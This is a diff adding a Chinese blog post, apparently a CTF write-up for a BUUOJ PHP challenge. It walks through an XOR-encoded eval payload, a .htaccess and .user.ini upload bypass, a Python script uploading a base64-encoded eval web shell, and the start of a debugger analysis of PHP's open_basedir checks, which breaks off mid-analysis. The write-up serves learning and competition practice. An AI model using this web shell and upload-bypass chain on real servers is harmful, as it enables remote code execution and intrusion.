@@ -172,6 +172,208 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-异或绕过以及文件上传之.htaccess文件以及open_basedir绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/04/%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B.htaccess%E6%96%87%E4%BB%B6%E4%BB%A5%E5%8F%8Aopen_basedir%E7%BB%95%E8%BF%87/" class="article-date">
+  	<time datetime="2021-10-03T16:00:00.000Z" itemprop="datePublished">2021-10-04</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/04/%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B.htaccess%E6%96%87%E4%BB%B6%E4%BB%A5%E5%8F%8Aopen_basedir%E7%BB%95%E8%BF%87/">
+        异或绕过以及文件上传之.htaccess文件以及open_basedir绕过
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="异或绕过以及文件上传之-htaccess文件以及open-basedir绕过"><a href="#异或绕过以及文件上传之-htaccess文件以及open-basedir绕过" class="headerlink" title="异或绕过以及文件上传之.htaccess文件以及open_basedir绕过"></a>异或绕过以及文件上传之.htaccess文件以及open_basedir绕过</h1><p>打开页面，发现是源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&#x27;_&#x27;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&#x27;One inch long, one inch strong!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;, $hhh) )</span><br><span class="line">    die(&#x27;Try something else!&#x27;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过审计源码，我们可以看见一个正则过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;, $hhh)</span><br></pre></td></tr></table></figure>
+<p>可见它过滤了数字和字母，以及一些符号，所以此时我们可以尝试着使用取反绕过或异或绕过，但是由于这里有长度绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(strlen($character_type)&gt;12)</span><br></pre></td></tr></table></figure>
+<p>所以最后决定采用异或绕过，因此我们可以写一个exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function finds($string)&#123;</span><br><span class="line">	$index=0;</span><br><span class="line">	$a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];</span><br><span class="line">	for($i=27;$i&lt;count($a);$i++)&#123;</span><br><span class="line">		for($j=27;$j&lt;count($a);$j++)&#123;</span><br><span class="line">			$x = $a[$i] ^ $a[$j];</span><br><span class="line">			for($k=0;$k&lt;strlen($string);$k++)&#123;</span><br><span class="line">				if(ord($string[$k])==$x)&#123;</span><br><span class="line">					echo $string[$k].&quot;\n&quot;;</span><br><span class="line">					echo &quot;%&quot;.dechex($a[$i]).&quot;^%&quot;.dechex($a[$j]).&quot;\n&quot;;</span><br><span class="line">					$index++;</span><br><span class="line">					if($index==strlen($string))&#123;</span><br><span class="line">						return 0;</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">finds(&quot;_GET&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>即可得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">G</span><br><span class="line">%86^%c1</span><br><span class="line">E</span><br><span class="line">%86^%c3</span><br><span class="line">T</span><br><span class="line">%86^%d2</span><br><span class="line">_</span><br><span class="line">%86^%d9</span><br></pre></td></tr></table></figure>
+<p>[异或或取反绕过][<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11546422.html]">https://www.cnblogs.com/cimuhuashuimu/p/11546422.html]</a></p>
+<p>因此，可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</span><br></pre></td></tr></table></figure>
+<p>然后可以看到php版本得信息，从disable_function中，我们可以看见很多函数被过滤掉了，所以我们可以尝试源码中得get_the_flag()函数，而从get_the_flag()函数中，我们可以知道我们需要上传文件，但是在源码中，我们可以看见</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);</span><br></pre></td></tr></table></figure>
+<p>这个if将文件后缀为php、phtml等文件都过滤掉了，而这个if</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False)</span><br></pre></td></tr></table></figure>
+<p>将文件内容有&lt;?的文件给过滤掉了，而这个if</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!exif_imagetype($tmp_name))</span><br></pre></td></tr></table></figure>
+<p>会检查文件头且限定只能上传image</p>
+<p>而由于这里的php版本太高，所以不可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>html的格式，所以我们可以利用.user.ini文件或.htaccess文件，</p>
+<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title="htaccess文件"></a>htaccess文件</h2><p>htacess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置</p>
+<p>利用方法一</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test&quot;&gt;</span><br><span class="line"> </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"> </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>通过它调用php解析器去解析文件名，只要文件名中包含”test”这个字符串的任意文件，无论扩展名是什么，都会以php的方式来解析</p>
+<p>利用方法二</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .png</span><br></pre></td></tr></table></figure>
+<p>让.png文件解析为php文件</p>
+<h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h2><p>对于.user.ini文件来说，只要是以fastcgi运行的php都可以用这个方法</p>
+<p>利用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=1.jpg </span><br></pre></td></tr></table></figure>
+<p>所有的php文件执行前都会将1.jpg文件当作是php类型文件先包含执行一遍，这里的GIF89a是文件幻术头进行绕过</p>
+<p>[.htaccess文件以及.user.ini文件][<a target="_blank" rel="noopener" href="https://blog.csdn.net/since_2020/article/details/113781120?utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link%5D">https://blog.csdn.net/since_2020/article/details/113781120?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link]</a></p>
+<p>回到题目本身，由于.user.ini是适用于nginx的，而.htaccess文件是适用于apache服务器，所以看php版本的信息后，我们可以知道这是apache服务器，所以使用.htaccess文件，我们可以将上传文件中的一句话用base64加密，然后在.htaccess中利用php伪协议进行解码，但是如果用GIF89a文件头来绕过文件头检测的话，.htaccess文件会无效，所以我们可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure>
+<p>由于#在.htaccess文件中是注释符的作用，因此可以绕过文件头检测，所以我们可以上传.htaccess文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application/x-httpd-php .ahhh</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后上传shell.ahhh文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12		#12是为了补足8个字节，满足base64编码的规则</span><br><span class="line">PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure>
+<p>然后构造上传的exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">htaccess=b&quot;&quot;&quot;</span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application/x-httpd-php .ahhh</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">shell=b&quot;GIF89a&quot;+base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;)</span><br><span class="line"></span><br><span class="line">url=&quot;http://fe2f819b-9807-4f4b-af87-a202256b7849.node4.buuoj.cn:81/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span><br><span class="line"></span><br><span class="line">files=&#123;&#x27;file&#x27;:(&#x27;.htaccess&#x27;,htaccess,&#x27;image/jpeg&#x27;)&#125;</span><br><span class="line"></span><br><span class="line">data=&#123;&quot;upload&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">response=requests.post(url=url,data=data,files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files=&#123;&#x27;file&#x27;:(&#x27;shell.ahhh&#x27;,shell,&#x27;image/jpeg&#x27;)&#125;</span><br><span class="line">response=requests.post(url=url,data=data,files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload/tmp_93df0602d768e80cec04f22bc0fb368d/.htaccess</span><br><span class="line">upload/tmp_93df0602d768e80cec04f22bc0fb368d/shell.ahhh</span><br></pre></td></tr></table></figure>
+<p>然后访问shell.ahhh，发现可以访问</p>
+<p>方法一<br>直接用蚁剑连接即可登录后台并得到flag</p>
+<p>方法二</p>
+<p>我们从disable_function中可以知道没有封禁的函数有echo、file_get_contents()、var_dump()和scandir()等，所以我们可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=var_dump(scandir(&quot;/&quot;));</span><br></pre></td></tr></table></figure>
+<p>来读取目录下的文件，但发现不行，因为在php版本中的open_basedir不可以访问/etc目录，所以我们需要bypass open_basedir</p>
+<h3 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h3><h4 id="ini-set覆盖问题"><a href="#ini-set覆盖问题" class="headerlink" title="ini_set覆盖问题"></a>ini_set覆盖问题</h4><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(ini_get(&#x27;open_basedir&#x27;));</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/tmp&#x27;);</span><br><span class="line">var_dump(ini_get(&#x27;open_basedir&#x27;));</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/&#x27;);</span><br><span class="line">var_dump(ini_get(&#x27;open_basedir&#x27;));</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;..&#x27;);</span><br><span class="line">var_dump(ini_get(&#x27;open_basedir&#x27;));</span><br></pre></td></tr></table></figure>
+<p>运行后的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string(0) &quot;&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br></pre></td></tr></table></figure>
+<p>可以看见open_basedir默认的值是空的，当第一次设置为/tmp后，后面无论怎么设置，都不会对第一次设置的open_basedir的值进行覆盖</p>
+<h5 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h5><p>找到php函数对应的底层函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_get：PHP_FUNCTION(ini_get)</span><br><span class="line">ini_set：PHP_FUNCTION(ini_set)</span><br></pre></td></tr></table></figure>
+<p>这里主要看ini_set的流程，因为ini_set是为一个配置选项设置值的，而ini_get是作为信息输出函数</p>
+<p>我们先对ini_set下断点，然后运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b /php7.0-src/ext/standard/basic_functions.c 5350</span><br><span class="line">r c.php</span><br></pre></td></tr></table></figure>
+<p>发现有三个初始值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zend_string *varname;</span><br><span class="line">zend_string *new_value;</span><br><span class="line">char *old_value;</span><br></pre></td></tr></table></figure>
+<p>然后会对我们输入的varname和new_value两个值进行处理，会得到<br>varname.val</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;varname.val</span><br><span class="line">$46 = (char (*)[1]) 0x7ffff7064978</span><br><span class="line">pwndbg&gt; x/s $46</span><br><span class="line">0x7ffff7064978:&quot;open_basedir&quot;</span><br></pre></td></tr></table></figure>
+<p>new_value.val</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;new_value.val</span><br><span class="line">$48 = (char (*)[1]) 0x7ffff7058ad8</span><br><span class="line">pwndbg&gt; x/s $48</span><br><span class="line">0x7ffff7058ad8:&quot;/tmp&quot;</span><br></pre></td></tr></table></figure>
+<p>上面都是zend_string的结构体，是php7的新增结构，然后程序会拿到原来的open_basedir的值化为zend_string结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;old_value.val</span><br><span class="line">$48 = (char (*)[1]) 0x8fca0d</span><br><span class="line">pwndbg&gt; x/s $48</span><br><span class="line">0x8fca0d:&quot;/tmp&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后会进入php_ini_check_path</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(PG(open_basedir))&#123;</span><br><span class="line">	if(_CHECK_PATH(ZSTR_VAL(varname),ZSTR_LEN(varname),&quot;error_log&quot;) || _CHECK_PATH(ZSTR_VAL(varname),ZSTR_LEN(varname),&quot;java.class.path&quot;) || _CHECK_PATH(ZSTR_VAL(varname),ZSTR_LEN(varname),&quot;java.home&quot;) || _CHECK_PATH(ZSTR_VAL(varname),ZSTR_LEN(varname),&quot;mail.log&quot;) || _CHECK_PATH(ZSTR_VAL(varname),ZSTR_LEN(varname),&quot;java.library.path)||</span><br></pre></td></tr></table></figure>
+<p>由于open_basedir默认为空，所以会跳出判断，进入到下一步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (zend_alter_ini_entry_ex(varname, new_value, PHP_INI_USER, PHP_INI_STAGE_RUNTIME, 0) == FAILURE) &#123;</span><br><span class="line">zval_dtor(return_value);</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看见这个if，我们可以看看一下FAILURE的定义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;</span><br><span class="line">  SUCCESS =  0,</span><br><span class="line">  FAILURE = -1,/* this MUST stay a negative number, or it may affect functions! */</span><br><span class="line">&#125; ZEND_RESULT_CODE;</span><br></pre></td></tr></table></figure>
+<p>发现当zend_alter_ini_entry_ex的返回值不为-1时，则代表成功，否则进入if，返回false，而经过比对，我们可以知道当第一次设置open_basedir和第二次设置open_basedir值时，这里返回的值是不一样的，第一次设置时，这里为SUCCESS，即为0，第二次设置为FAILURE，即为-1，所以我们可以看zend_alter_ini_entry_ex进行比对</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b /php7.0-src/Zend/zend_ini.c:330</span><br></pre></td></tr></table></figure>
+
+<p>发现两次不同点在于以下判断</p>
+<p>第一次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!ini_entry-&gt;on_modify|| ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) == SUCCESS)</span><br></pre></td></tr></table></figure>
+
+<p>第二次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_entry-&gt;on_modify ：0x5d046e &lt;OnUpdateBaseDir&gt;ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) = -1</span><br></pre></td></tr></table></figure>
+<p>发现里面有个on_modify(有关修改)，所以我们可以单步跟进</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI ZEND_INI_MH(OnUpdateBaseDir)</span><br></pre></td></tr></table></figure>
+<p>发现是因为进行了以下操作才会在第二次时返回FAILURE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (php_check_open_basedir_ex(ptr, 0) != 0) &#123;</span><br><span class="line">/* At least one portion of this open_basedir is less restrictive than the prior one, FAIL */efree(pathbuf);</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正是因为php_check_open_basedir_ex()没有通过才导致ini_set失败，但是在第一次是通过的，所以如果想要利用ini_set覆盖之前的open_basedir，就要通过这个校验</p>
+<p>所以我们要分析php_check_open_basedir_ex，来bypass php_check_open_basedir_ex</p>
+<p>php_check_open_basedir_ex的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (strlen(path) &gt; (MAXPATHLEN - 1)) &#123;</span><br><span class="line">php_error_docref(NULL, E_WARNING, &quot;File name is longer than the maximum allowed path length on this platform (%d): %s&quot;, MAXPATHLEN, path);</span><br><span class="line">errno = EINVAL;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line">#define MAXPATHLEN      PATH_MAX</span><br><span class="line">#define PATH_MAX                 1024   /* max bytes in pathname */</span><br></pre></td></tr></table></figure>
+
+<p>首先判断路径是否超过1023，然后就是另一个校验函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (php_check_specific_open_basedir(ptr, path) == 0) &#123;</span><br><span class="line">    efree(pathbuf);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析php_check_specific_open_basedir函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (strcmp(basedir, &quot;.&quot;) || !VCWD_GETCWD(local_open_basedir, MAXPATHLEN)) &#123;</span><br><span class="line">/* Else use the unmodified path */</span><br><span class="line">strlcpy(local_open_basedir, basedir, sizeof(local_open_basedir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>它首先比对了当前目录并赋值给local_open_basedir</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">path_len = strlen(path);</span><br><span class="line">if (path_len &gt; (MAXPATHLEN - 1)) &#123;</span><br><span class="line">    /* empty and too long paths are invalid */</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后看目录名长度是否合法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (expand_filepath(path, resolved_name) == NULL) &#123;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI char *expand_filepath(const char *filepath, char *real_path)&#123;</span><br><span class="line">return expand_filepath_ex(filepath, real_path, NULL, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后将传入的path，用绝对路径保存在resolved_name中</p>
+<p>然后继续判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (expand_filepath(local_open_basedir, resolved_basedir) != NULL)</span><br></pre></td></tr></table></figure>
